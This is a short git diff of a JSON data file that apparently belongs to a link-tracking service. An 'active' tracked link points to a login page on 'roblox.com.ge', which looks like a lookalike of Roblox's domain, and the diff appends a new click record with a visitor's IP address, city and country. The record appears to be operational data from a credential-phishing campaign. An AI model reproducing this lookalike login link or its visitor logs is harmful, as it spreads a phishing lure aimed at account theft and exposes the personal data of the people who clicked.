@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1097,
+    "useCount": 1098,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8920,6 +8920,14 @@
         "city": "Juazeiro do Norte",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777260722974,
+        "ip": "110.159.133.106",
+        "country": "Malaysia",
+        "city": "Ipoh",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
